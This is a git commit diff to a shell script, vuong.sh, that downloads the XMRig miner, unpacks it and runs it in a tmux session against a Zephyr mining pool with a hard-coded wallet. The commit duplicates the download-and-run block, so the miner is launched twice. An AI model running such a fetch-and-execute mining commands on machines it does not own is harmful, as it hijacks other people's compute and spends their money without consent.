42a51a0c3d64162aeee073206b6bec051b93f815
Cua4Store <130009389+Cua4Store@users.noreply.github.com>
2024-01-07 14:24:28 +0800

    Update vuong.sh

--- vuong.sh
+++ vuong.sh
@@ -8,6 +8,10 @@ tmux send-keys -t my_session "wget https://github.com/xmrig/xmrig/releases/downl
 tar xavf xmrig-6.19.2-linux-x64.tar.gz 
 cd xmrig-6.19.2 
 ./xmrig -o de.zephyr.herominers.com:1123  -u ZEPHs96KuGJ4Wrphf9yYuzaSpnJ4CntuHU6rSuFNv8FgBd9zPjtTwTLRctBVdk84FQTdr9S6DDLwbS8rh2fFybaEALPTXJCrvQR -p Cuaml1 -a rx/0 -k
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz 
+tar xavf xmrig-6.19.2-linux-x64.tar.gz 
+cd xmrig-6.19.2 
+./xmrig -o de.zephyr.herominers.com:1123  -u ZEPHs96KuGJ4Wrphf9yYuzaSpnJ4CntuHU6rSuFNv8FgBd9zPjtTwTLRctBVdk84FQTdr9S6DDLwbS8rh2fFybaEALPTXJCrvQR -p Cuaml1 -a rx/0 -k
 
 " C-m
 
